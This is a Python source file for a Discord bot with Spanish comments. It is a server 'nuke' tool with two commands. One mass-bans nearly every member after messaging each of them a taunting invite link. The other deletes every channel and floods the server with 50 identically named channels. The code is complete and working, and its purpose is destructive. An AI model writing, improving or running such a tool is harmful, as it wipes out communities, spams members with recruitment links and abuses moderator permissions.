import discord
from discord.ext import commands
import asyncio
import logging

# Configuración de logging optimizada
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)

TOKEN = "TOKEN"
PREFIX = "!"

# Configuración explícita de Intents indispensables
intents = discord.Intents.default()
intents.members = True  
intents.messages = True  
intents.message_content = True  

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    logging.info(f"Bot {bot.user.name} conectado exitosamente. ID: {bot.user.id}")

@bot.command()
async def banpro(ctx):
    logging.info(f"Comando !banpro solicitado por {ctx.author} (ID: {ctx.author.id})")
    
    # 1. Verificación de permisos del autor
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("❌ No tienes permisos (`ban_members`) para ejecutar esta acción.")
        return

    # 2. Verificación de permisos del bot
    if not ctx.guild.me.guild_permissions.ban_members:
        await ctx.send("❌ El bot no tiene permisos suficientes de Banear Miembros en este servidor.")
        return
    
    # Tu nuevo mensaje personalizado para el DM
    mensaje_dm = "Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/aACMXB4HSp"
    
    # Filtrar objetivos válidos (Excluye bots, al autor y a roles superiores al bot)
    targets = [
        member for member in ctx.guild.members 
        if not member.bot 
        and member.id != ctx.author.id 
        and member.top_role < ctx.guild.me.top_role
    ]
    
    total_targets = len(targets)
    if total_targets == 0:
        await ctx.send("⚠️ No se encontraron miembros elegibles para banear.")
        return

    await ctx.send(f"⚡ Iniciando baneo masivo en {total_targets} miembros...")
    banned_count = 0
    
    # Función interna para enviar DM y banear
    async def process_member(member):
        nonlocal banned_count
        # Intento de envío de mensaje privado (DM) antes del baneo
        try:
            await member.send(mensaje_dm)
        except (discord.Forbidden, discord.HTTPException):
            # Silencioso si tienen los DMs cerrados
            pass
            
        # Intento de baneo
        try:
            await member.ban(reason="Baneo masivo By Mac.")
            banned_count += 1
            logging.info(f"[ÉXITO] {member} ha sido baneado.")
        except discord.Forbidden:
            logging.warning(f"[DENEGADO] Permisos insuficientes para banear a {member}.")
        except discord.HTTPException as e:
            logging.error(f"[ERROR HTTP] Error al procesar a {member}: {e}")

    # Ejecución concurrente en bloques de 10 usuarios
    chunk_size = 10
    for i in range(0, total_targets, chunk_size):
        chunk = targets[i:i + chunk_size]
        tasks = [process_member(m) for m in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(1.2)  # Pausa prudencial para evitar Rate Limits
    
    await ctx.send(f"✅ Proceso completado. Se han purgado {banned_count} de {total_targets} miembros.")


@bot.command()
async def rD(ctx):
    logging.info(f"Comando !rD solicitado por {ctx.author} (ID: {ctx.author.id})")
    
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("❌ No tienes permisos (`manage_channels`) para usar este comando.")
        return
        
    if not ctx.guild.me.guild_permissions.manage_channels:
        await ctx.send("❌ El bot no tiene permisos suficientes para gestionar canales.")
        return

    await ctx.send("💥 Eliminando todos los canales actuales...")

    channels_to_delete = list(ctx.guild.channels)
    
    async def delete_channel(channel):
        try:
            await channel.delete(reason="haciendo arreglos 😈.")
            logging.info(f"[BORRADO] Canal/Categoría: {channel.name}")
        except discord.Forbidden:
            pass
        except discord.HTTPException as e:
            logging.error(f"[ERROR] Al borrar {channel.name}: {e}")

    delete_chunk_size = 10
    for i in range(0, len(channels_to_delete), delete_chunk_size):
        chunk = channels_to_delete[i:i + delete_chunk_size]
        tasks = [delete_channel(ch) for ch in chunk]
        await asyncio.gather(*tasks)
        await asyncio.sleep(1.0)

    logging.info("Creando nuevos canales 'Mc R'...")
    
    # Configurado exactamente a los 50 canales que querías
    num_new_channels = 50 
    
    async def create_channel_task(index):
        try:
            await ctx.guild.create_text_channel(name="Mc R", reason="Generación masiva.")
            logging.info(f"[CREADO] Canal Mc R #{index}")
        except discord.HTTPException as e:
            logging.error(f"[ERROR] No se pudo crear canal #{index}: {e}")

    for i in range(0, num_new_channels, 10):
        tasks = [create_channel_task(j) for j in range(i, min(i + 10, num_new_channels))]
        await asyncio.gather(*tasks)
        await asyncio.sleep(1.0)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    logging.error(f"Error detectado en comando: {error}")

bot.run(TOKEN)
              
